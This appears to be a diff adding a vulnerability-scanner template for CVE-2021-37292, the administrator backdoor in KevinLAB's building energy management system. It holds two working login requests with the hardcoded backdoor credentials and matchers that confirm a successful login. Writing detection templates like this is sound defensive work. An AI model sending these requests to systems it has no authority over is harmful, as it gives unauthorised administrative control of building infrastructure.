@@ -1,0 +1,46 @@
+id: CVE-2021-37292
+info:
+  name: KevinLAB BEMS Backdoor
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    KevinLAB Building Energy Management System (KevinLAB BEMS) is a building energy management system of KevinLAB Company in Korea. A security vulnerability exists in KevinLAB Building Energy Management System 1.0.0 that allows an attacker to log in with a background account with the highest administrator privileges and gain control of the system.
+  classification:
+    cve-id: CVE-2021-37292
+    cvss-score: 9.8
+  tags: backdoor
+http:
+  - raw:
+      - |
+        POST /http/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%5D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "result"
+          - "true"
+  - raw:
+      - |
+        POST /http/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22developer1%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%221234%22%7D%5D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "result"
+          - "true"
